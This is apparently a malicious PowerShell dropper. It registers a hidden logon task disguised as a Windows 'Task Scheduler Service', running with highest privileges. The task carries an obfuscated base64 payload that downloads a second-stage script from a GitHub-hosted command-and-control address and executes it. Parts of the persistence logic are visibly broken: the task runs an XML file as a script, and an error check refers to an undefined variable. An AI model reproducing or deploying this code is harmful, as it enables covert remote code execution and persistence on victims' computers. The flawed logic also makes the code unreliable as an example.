$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

$EMBEDDED_BASE64 = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgAKACQAUAByAG8AZwByAGUAcwBzAFAAcgBlAGYAZQByAGUAbgBjAGUAIAA9ACAAIgBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACIACgAkAEMAMgAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AdwBvAGwAZgBnAGEAbgBnAHAAaABlAGwAYQBuADkAOQA0ADkAMgA0AC8AdwBpAG4AZABvAHcAMQAxAC8AbQBhAGkAbgAiAAoAJABTAHQAYQBnAGUAMQBVAHIAbAAgAD0AIAAiACQAQwAyAC8AMQAuAHAAcwAxACIACgAkAEUAbgBjAG8AZABlAGQAQgBvAGQAeQAgAD0AIAAiAGQAQQBCAHkAQQBIAGsAQQBJAEEAQgA3AEEAQQBvAEEASQBBAEEAZwBBAEMAQQBBAEkAQQBBAGsAQQBIAGMAQQBaAFEAQgBpAEEARQBNAEEAYgBBAEIAcABBAEcAVQBBAGIAZwBCADAAQQBDAEEAQQBQAFEAQQBnAEEARQA0AEEAWgBRAEIAMwBBAEMAMABBAFQAdwBCAGkAQQBHAG8AQQBaAFEAQgBqAEEASABRAEEASQBBAEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAGMAQQBaAFEAQgBpAEEARQBNAEEAYgBBAEIAcABBAEcAVQBBAGIAZwBCADAAQQBBAG8AQQBJAEEAQQBnAEEAQwBBAEEASQBBAEEAawBBAEgATQBBAGQAQQBCAGgAQQBHAGMAQQBaAFEAQQB4AEEARQBNAEEAYgB3AEIAdQBBAEgAUQBBAFoAUQBCAHUAQQBIAFEAQQBJAEEAQQA5AEEAQwBBAEEASgBBAEIAMwBBAEcAVQBBAFkAZwBCAEQAQQBHAHcAQQBhAFEAQgBsAEEARwA0AEEAZABBAEEAdQBBAEUAUQBBAGIAdwBCADMAQQBHADQAQQBiAEEAQgB2AEEARwBFAEEAWgBBAEIAVABBAEgAUQBBAGMAZwBCAHAAQQBHADQAQQBaAHcAQQBvAEEAQwBRAEEAVQB3AEIAMABBAEcARQBBAFoAdwBCAGwAQQBEAEUAQQBWAFEAQgB5AEEARwB3AEEASwBRAEEASwBBAEMAQQBBAEkAQQBBAGcAQQBDAEEAQQBTAFEAQgB1AEEASABZAEEAYgB3AEIAcgBBAEcAVQBBAEwAUQBCAEYAQQBIAGcAQQBjAEEAQgB5AEEARwBVAEEAYwB3AEIAegBBAEcAawBBAGIAdwBCAHUAQQBDAEEAQQBKAEEAQgB6AEEASABRAEEAWQBRAEIAbgBBAEcAVQBBAE0AUQBCAEQAQQBHADgAQQBiAGcAQgAwAEEARwBVAEEAYgBnAEIAMABBAEEAbwBBAGYAUQBBAGcAQQBHAE0AQQBZAFEAQgAwAEEARwBNAEEAYQBBAEEAZwBBAEgAcwBBAEMAZwBBAGcAQQBDAEEAQQBJAEEAQQBnAEEARgBjAEEAYwBnAEIAcABBAEgAUQBBAFoAUQBBAHQAQQBGAFkAQQBaAFEAQgB5AEEARwBJAEEAYgB3AEIAegBBAEcAVQBBAEkAQQBBAGkAQQBFAFkAQQBZAFEAQgBwAEEARwB3AEEAWgBRAEIAawBBAEQAbwBBAEkAQQBBAGsAQQBGADgAQQBJAGcAQQBLAEEASAAwAEEAIgAKAHQAcgB5ACAAewAKACAAIAAgACAAaQBmACAAKAAkAEUAbgBjAG8AZABlAGQAQgBvAGQAeQApACAAewAKACAAIAAgACAAIAAgACAAIAAkAEQAZQBjAG8AZABlAGQAQgBvAGQAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQARQBuAGMAbwBkAGUAZABCAG8AZAB5ACkAKQAKACAAIAAgACAAIAAgACAAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAEQAZQBjAG8AZABlAGQAQgBvAGQAeQAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBWAGUAcgBiAG8AcwBlACAAIgBEAHIAbwBwAHAAZQByACAAZgBhAGkAbABlAGQAOgAgACQAXwAiAAoAfQA="

$TempDir = $env:TEMP
$TaskName = "TaskSchedulerService"
$TaskPath = "\$TaskName"
function Build-TaskXml {
    param(
        [string]$Base64Cmd,
        [string]$OutputXmlPath
    )

    $currentUserName = [System.Environment]::UserName
    $currentDomain = [System.Environment]::UserDomainName
    $userId = if ($currentDomain -eq "." -or $currentDomain -eq $env:COMPUTERNAME) { 
        "$env:COMPUTERNAME\$currentUserName" 
    } else { 
        "$currentDomain\$currentUserName" 
    }

    $xmlTemplate = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-27T12:00:00</Date>
    <Author>$currentUserName</Author>
    <Description>Windows Task Scheduler Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$userId</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $Base64Cmd</Arguments>
    </Exec>
  </Actions>
</Task>
"@

    [System.IO.File]::WriteAllText($OutputXmlPath, $xmlTemplate, [System.Text.Encoding]::Unicode)
}
function Invoke-Persistence {
    try {
        # Write dropper to temp file
        $xmlPath = Join-Path $TempDir "task.xml"
        
        # Build XML
        Build-TaskXml -Base64Cmd $EMBEDDED_BASE64 -OutputXmlPath $xmlPath
        
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$xmlPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User "$env:USERDOMAIN\$env:USERNAME"
        
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Force
        Start-ScheduledTask -TaskName $TaskName
         if ($LASTEXITCODE -ne 0) {
            throw "schtasks failed: $($result -join ' ')"
        }

        # Cleanup
        Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
        Write-Verbose "Task '$TaskName' registered successfully."
    } catch {
        Write-Error "Persistence failed: $_"
    }
}

Start-Sleep -Seconds 2
Invoke-Persistence
